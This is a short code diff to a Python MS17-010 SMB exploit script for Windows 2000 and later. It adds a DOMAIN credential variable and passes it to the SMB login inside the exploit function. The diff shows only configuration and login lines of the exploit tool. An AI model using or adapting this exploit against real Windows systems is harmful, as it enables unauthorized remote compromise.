@@ -9,6 +9,12 @@ import string
 import random
 import os.path
 
+
+USERNAME = ''		#Edit username
+PASSWORD = ''		#Edit password
+DOMAIN = ''		#Edit domain
+
+
 '''
 MS17-010 exploit for Windows 2000 and later by sleepya
 
@@ -33,9 +39,6 @@ Tested on:
 - Windows XP SP3 x86
 - Windows 2000 SP4 x86
 '''
-
-USERNAME = ''
-PASSWORD = ''
 
 '''
 A transaction with empty setup:
@@ -798,7 +801,7 @@ def exploit(target, port, pipe_name):
 
 	info = {}
 
-	conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
+	conn.login(USERNAME, PASSWORD,DOMAIN,maxBufferSize=4356)
 	server_os = conn.get_server_os()
 	print('Target OS: '+server_os)
 	if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
